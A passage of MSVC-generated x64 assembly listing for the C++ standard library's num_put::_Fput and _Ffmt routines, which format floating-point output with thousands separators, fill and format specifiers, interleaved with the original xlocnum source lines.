	je	SHORT $LN8@Fput

; 1444 :             _Groupstring[_Poff] = _Punct_fac.decimal_point();

	mov	rcx, QWORD PTR _Punct_fac$[rsp]
	call	?decimal_point@?$numpunct@D@std@@QEBADXZ ; std::numpunct<char>::decimal_point
	mov	BYTE PTR tv242[rsp], al
	mov	rdx, QWORD PTR _Poff$[rsp]
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	movzx	ecx, BYTE PTR tv242[rsp]
	mov	BYTE PTR [rax], cl
$LN8@Fput:

; 1445 :         }
; 1446 : 
; 1447 :         size_t _Off     = _Poff == _Count ? _Eoff : _Poff;

	mov	rax, QWORD PTR _Count$[rsp]
	cmp	QWORD PTR _Poff$[rsp], rax
	jne	SHORT $LN21@Fput
	mov	rax, QWORD PTR _Eoff$[rsp]
	mov	QWORD PTR tv188[rsp], rax
	jmp	SHORT $LN22@Fput
$LN21@Fput:
	mov	rax, QWORD PTR _Poff$[rsp]
	mov	QWORD PTR tv188[rsp], rax
$LN22@Fput:
	mov	rax, QWORD PTR tv188[rsp]
	mov	QWORD PTR _Off$[rsp], rax

; 1448 :         const char* _Pg = &_Grouping[0];

	xor	edx, edx
	lea	rcx, QWORD PTR _Grouping$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	mov	QWORD PTR _Pg$[rsp], rax
$LN2@Fput:

; 1449 :         while (*_Pg != CHAR_MAX && '\0' < *_Pg && static_cast<size_t>(*_Pg) < _Off - _Prefix) {

	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 127				; 0000007fH
	je	$LN3@Fput
	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jle	SHORT $LN3@Fput
	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	rax, BYTE PTR [rax]
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	rdx, QWORD PTR _Off$[rsp]
	sub	rdx, rcx
	mov	rcx, rdx
	cmp	rax, rcx
	jae	SHORT $LN3@Fput

; 1450 :             // add thousands separator
; 1451 :             _Groupstring.insert(_Off -= *_Pg, 1, _Kseparator);

	mov	rax, QWORD PTR _Pg$[rsp]
	movsx	rax, BYTE PTR [rax]
	mov	rcx, QWORD PTR _Off$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Off$[rsp], rax
	movzx	r9d, BYTE PTR _Kseparator$[rsp]
	mov	r8d, 1
	mov	rdx, QWORD PTR _Off$[rsp]
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::insert

; 1452 :             if ('\0' < _Pg[1]) {

	mov	eax, 1
	imul	rax, rax, 1
	mov	rcx, QWORD PTR _Pg$[rsp]
	movsx	eax, BYTE PTR [rcx+rax]
	test	eax, eax
	jle	SHORT $LN9@Fput

; 1453 :                 ++_Pg; // not last group, advance

	mov	rax, QWORD PTR _Pg$[rsp]
	inc	rax
	mov	QWORD PTR _Pg$[rsp], rax
$LN9@Fput:

; 1454 :             }
; 1455 :         }

	jmp	$LN2@Fput
$LN3@Fput:

; 1456 : 
; 1457 :         _Count = _Groupstring.size();

	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	QWORD PTR _Count$[rsp], rax

; 1458 : 
; 1459 :         size_t _Fillcount;
; 1460 :         if (_Iosbase.width() <= 0 || static_cast<size_t>(_Iosbase.width()) <= _Count) {

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	test	rax, rax
	jle	SHORT $LN12@Fput
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	cmp	rax, QWORD PTR _Count$[rsp]
	ja	SHORT $LN10@Fput
$LN12@Fput:

; 1461 :             _Fillcount = 0;

	mov	QWORD PTR _Fillcount$[rsp], 0

; 1462 :         } else {

	jmp	SHORT $LN11@Fput
$LN10@Fput:

; 1463 :             _Fillcount = static_cast<size_t>(_Iosbase.width()) - _Count;

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	sub	rax, QWORD PTR _Count$[rsp]
	mov	QWORD PTR _Fillcount$[rsp], rax
$LN11@Fput:

; 1464 :         }
; 1465 : 
; 1466 :         ios_base::fmtflags _Adjustfield = _Iosbase.flags() & ios_base::adjustfield;

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 448				; 000001c0H
	mov	DWORD PTR _Adjustfield$[rsp], eax

; 1467 :         if (_Adjustfield != ios_base::left && _Adjustfield != ios_base::internal) { // put leading fill

	cmp	DWORD PTR _Adjustfield$[rsp], 64	; 00000040H
	je	$LN13@Fput
	cmp	DWORD PTR _Adjustfield$[rsp], 256	; 00000100H
	je	$LN13@Fput

; 1468 :             _Dest      = _Rep(_Dest, _Fill, _Fillcount);

	lea	rax, QWORD PTR $T3[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T3[rsp]
	lea	rdx, QWORD PTR $T10[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1469 :             _Fillcount = 0;

	mov	QWORD PTR _Fillcount$[rsp], 0

; 1470 :             _Dest      = _Put(_Dest, &_Groupstring[0], _Prefix);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T4[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T4[rsp]
	lea	rdx, QWORD PTR $T11[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb
	jmp	$LN14@Fput
$LN13@Fput:

; 1471 :         } else if (_Adjustfield == ios_base::internal) { // put internal fill

	cmp	DWORD PTR _Adjustfield$[rsp], 256	; 00000100H
	jne	$LN15@Fput

; 1472 :             _Dest      = _Put(_Dest, &_Groupstring[0], _Prefix);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T5[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T5[rsp]
	lea	rdx, QWORD PTR $T12[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1473 :             _Dest      = _Rep(_Dest, _Fill, _Fillcount);

	lea	rax, QWORD PTR $T6[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T6[rsp]
	lea	rdx, QWORD PTR $T13[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1474 :             _Fillcount = 0;

	mov	QWORD PTR _Fillcount$[rsp], 0

; 1475 :         } else {

	jmp	SHORT $LN14@Fput
$LN15@Fput:

; 1476 :             _Dest = _Put(_Dest, &_Groupstring[0], _Prefix);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T7[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T7[rsp]
	lea	rdx, QWORD PTR $T14[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb
$LN14@Fput:

; 1477 :         }
; 1478 : 
; 1479 :         _Dest = _Put(_Dest, &_Groupstring[_Prefix], _Count - _Prefix);

	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR tv273[rsp], rax
	mov	rdx, QWORD PTR _Prefix$[rsp]
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T8[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR tv273[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T8[rsp]
	lea	rdx, QWORD PTR $T15[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1480 :         _Iosbase.width(0);

	xor	edx, edx
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEAA_J_J@Z		; std::ios_base::width

; 1481 :         return _Rep(_Dest, _Fill, _Fillcount); // put trailing fill

	lea	rax, QWORD PTR $T9[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T9[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	npad	1
	lea	rcx, QWORD PTR _Grouping$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1482 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 520				; 00000208H
	pop	rdi
	pop	rsi
	ret	0
?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv242 = 48
_Kseparator$ = 49
_Prefix$ = 56
_Dp$ = 64
_Adjustfield$ = 68
_Pg$ = 72
_Fillcount$ = 80
_Poff$ = 88
_Off$ = 96
_Punct_fac$ = 104
tv69 = 112
_Exps$ = 120
tv188 = 128
tv297 = 136
tv290 = 144
_Ctype_fac$ = 152
tv156 = 160
tv293 = 168
_Eoff$ = 176
tv273 = 184
$T1 = 192
$T2 = 208
$T3 = 224
$T4 = 240
$T5 = 256
$T6 = 272
$T7 = 288
$T8 = 304
$T9 = 320
$T10 = 336
$T11 = 352
$T12 = 368
$T13 = 384
$T14 = 400
$T15 = 416
_Groupstring$ = 432
_Grouping$ = 464
__$ArrayPad$ = 496
this$ = 544
__$ReturnUdt$ = 552
_Dest$ = 560
_Iosbase$ = 568
_Fill$ = 576
_Buf$ = 584
_Count$ = 592
?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T1[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv242 = 48
_Kseparator$ = 49
_Prefix$ = 56
_Dp$ = 64
_Adjustfield$ = 68
_Pg$ = 72
_Fillcount$ = 80
_Poff$ = 88
_Off$ = 96
_Punct_fac$ = 104
tv69 = 112
_Exps$ = 120
tv188 = 128
tv297 = 136
tv290 = 144
_Ctype_fac$ = 152
tv156 = 160
tv293 = 168
_Eoff$ = 176
tv273 = 184
$T1 = 192
$T2 = 208
$T3 = 224
$T4 = 240
$T5 = 256
$T6 = 272
$T7 = 288
$T8 = 304
$T9 = 320
$T10 = 336
$T11 = 352
$T12 = 368
$T13 = 384
$T14 = 400
$T15 = 416
_Groupstring$ = 432
_Grouping$ = 464
__$ArrayPad$ = 496
this$ = 544
__$ReturnUdt$ = 552
_Dest$ = 560
_Iosbase$ = 568
_Fill$ = 576
_Buf$ = 584
_Count$ = 592
?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Groupstring$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv242 = 48
_Kseparator$ = 49
_Prefix$ = 56
_Dp$ = 64
_Adjustfield$ = 68
_Pg$ = 72
_Fillcount$ = 80
_Poff$ = 88
_Off$ = 96
_Punct_fac$ = 104
tv69 = 112
_Exps$ = 120
tv188 = 128
tv297 = 136
tv290 = 144
_Ctype_fac$ = 152
tv156 = 160
tv293 = 168
_Eoff$ = 176
tv273 = 184
$T1 = 192
$T2 = 208
$T3 = 224
$T4 = 240
$T5 = 256
$T6 = 272
$T7 = 288
$T8 = 304
$T9 = 320
$T10 = 336
$T11 = 352
$T12 = 368
$T13 = 384
$T14 = 400
$T15 = 416
_Groupstring$ = 432
_Grouping$ = 464
__$ArrayPad$ = 496
this$ = 544
__$ReturnUdt$ = 552
_Dest$ = 560
_Iosbase$ = 568
_Fill$ = 576
_Buf$ = 584
_Count$ = 592
?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$2
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T2[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv242 = 48
_Kseparator$ = 49
_Prefix$ = 56
_Dp$ = 64
_Adjustfield$ = 68
_Pg$ = 72
_Fillcount$ = 80
_Poff$ = 88
_Off$ = 96
_Punct_fac$ = 104
tv69 = 112
_Exps$ = 120
tv188 = 128
tv297 = 136
tv290 = 144
_Ctype_fac$ = 152
tv156 = 160
tv293 = 168
_Eoff$ = 176
tv273 = 184
$T1 = 192
$T2 = 208
$T3 = 224
$T4 = 240
$T5 = 256
$T6 = 272
$T7 = 288
$T8 = 304
$T9 = 320
$T10 = 336
$T11 = 352
$T12 = 368
$T13 = 384
$T14 = 400
$T15 = 416
_Groupstring$ = 432
_Grouping$ = 464
__$ArrayPad$ = 496
this$ = 544
__$ReturnUdt$ = 552
_Dest$ = 560
_Iosbase$ = 568
_Fill$ = 576
_Buf$ = 584
_Count$ = 592
?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$3
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Grouping$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput'::`1'::dtor$3
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z
_TEXT	SEGMENT
_Ch$ = 0
_Ffl$ = 4
_Ptr$ = 8
this$ = 32
_Fmt$ = 40
_Spec$ = 48
_Flags$ = 56
?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ffmt, COMDAT

; 1370 :         char* _Fmt, char _Spec, ios_base::fmtflags _Flags) const { // generate sprintf format for floating-point

$LN20:
	mov	DWORD PTR [rsp+32], r9d
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1371 :         char* _Ptr = _Fmt;

	mov	rax, QWORD PTR _Fmt$[rsp]
	mov	QWORD PTR _Ptr$[rsp], rax

; 1372 :         *_Ptr++    = '%';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 37			; 00000025H
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1373 : 
; 1374 :         if (_Flags & ios_base::showpos) {

	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 32					; 00000020H
	test	eax, eax
	je	SHORT $LN2@Ffmt

; 1375 :             *_Ptr++ = '+';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 43			; 0000002bH
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN2@Ffmt:

; 1376 :         }
; 1377 : 
; 1378 :         if (_Flags & ios_base::showpoint) {

	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 16
	test	eax, eax
	je	SHORT $LN3@Ffmt

; 1379 :             *_Ptr++ = '#';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 35			; 00000023H
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN3@Ffmt:

; 1380 :         }
; 1381 : 
; 1382 :         *_Ptr++ = '.';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 46			; 0000002eH
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1383 :         *_Ptr++ = '*'; // for precision argument

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 42			; 0000002aH
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1384 :         if (_Spec != '\0') {

	movsx	eax, BYTE PTR _Spec$[rsp]
	test	eax, eax
	je	SHORT $LN4@Ffmt

; 1385 :             *_Ptr++ = _Spec; // 'L' qualifier for long double only

	mov	rax, QWORD PTR _Ptr$[rsp]
	movzx	ecx, BYTE PTR _Spec$[rsp]
	mov	BYTE PTR [rax], cl
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN4@Ffmt:

; 1386 :         }
; 1387 : 
; 1388 :         char _Ch; // specifier
; 1389 :         ios_base::fmtflags _Ffl = _Flags & ios_base::floatfield;

	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 12288				; 00003000H
	mov	DWORD PTR _Ffl$[rsp], eax

; 1390 :         if (_Flags & ios_base::uppercase) {

	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 4
	test	eax, eax
	je	SHORT $LN5@Ffmt

; 1391 :             if (_Ffl == ios_base::fixed) {

	cmp	DWORD PTR _Ffl$[rsp], 8192		; 00002000H
	jne	SHORT $LN7@Ffmt

; 1392 :                 _Ch = 'f';

	mov	BYTE PTR _Ch$[rsp], 102			; 00000066H
	jmp	SHORT $LN8@Ffmt
$LN7@Ffmt:

; 1393 :             } else if (_Ffl == ios_base::hexfloat) {

	cmp	DWORD PTR _Ffl$[rsp], 12288		; 00003000H
	jne	SHORT $LN9@Ffmt

; 1394 :                 _Ch = 'A'; // added with TR1

	mov	BYTE PTR _Ch$[rsp], 65			; 00000041H
	jmp	SHORT $LN10@Ffmt
$LN9@Ffmt:

; 1395 :             } else if (_Ffl == ios_base::scientific) {

	cmp	DWORD PTR _Ffl$[rsp], 4096		; 00001000H
	jne	SHORT $LN11@Ffmt

; 1396 :                 _Ch = 'E';

	mov	BYTE PTR _Ch$[rsp], 69			; 00000045H

; 1397 :             } else {

	jmp	SHORT $LN12@Ffmt
$LN11@Ffmt:

; 1398 :                 _Ch = 'G';

	mov	BYTE PTR _Ch$[rsp], 71			; 00000047H
$LN12@Ffmt:
$LN10@Ffmt:
$LN8@Ffmt:

; 1399 :             }
; 1400 :         } else {

	jmp	SHORT $LN6@Ffmt
$LN5@Ffmt:

; 1401 :             if (_Ffl == ios_base::fixed) {

	cmp	DWORD PTR _Ffl$[rsp], 8192		; 00002000H
	jne	SHORT $LN13@Ffmt

; 1402 :                 _Ch = 'f';

	mov	BYTE PTR _Ch$[rsp], 102			; 00000066H
	jmp	SHORT $LN14@Ffmt
$LN13@Ffmt:

; 1403 :             } else if (_Ffl == ios_base::hexfloat) {

	cmp	DWORD PTR _Ffl$[rsp], 12288		; 00003000H
	jne	SHORT $LN15@Ffmt

; 1404 :                 _Ch = 'a'; // added with TR1

	mov	BYTE PTR _Ch$[rsp], 97			; 00000061H
	jmp	SHORT $LN16@Ffmt
$LN15@Ffmt:

; 1405 :             } else if (_Ffl == ios_base::scientific) {

	cmp	DWORD PTR _Ffl$[rsp], 4096		; 00001000H
	jne	SHORT $LN17@Ffmt

; 1406 :                 _Ch = 'e';

	mov	BYTE PTR _Ch$[rsp], 101			; 00000065H

; 1407 :             } else {

	jmp	SHORT $LN18@Ffmt
$LN17@Ffmt:

; 1408 :                 _Ch = 'g';

	mov	BYTE PTR _Ch$[rsp], 103			; 00000067H
$LN18@Ffmt:
$LN16@Ffmt:
$LN14@Ffmt:
$LN6@Ffmt:

; 1409 :             }
; 1410 :         }
; 1411 :         *_Ptr++ = _Ch;

	mov	rax, QWORD PTR _Ptr$[rsp]
	movzx	ecx, BYTE PTR _Ch$[rsp]
	mov	BYTE PTR [rax], cl
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1412 : 
; 1413 :         *_Ptr = '\0';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 0

; 1414 :         return _Fmt;

	mov	rax, QWORD PTR _Fmt$[rsp]

; 1415 :     }

	add	rsp, 24
	ret	0
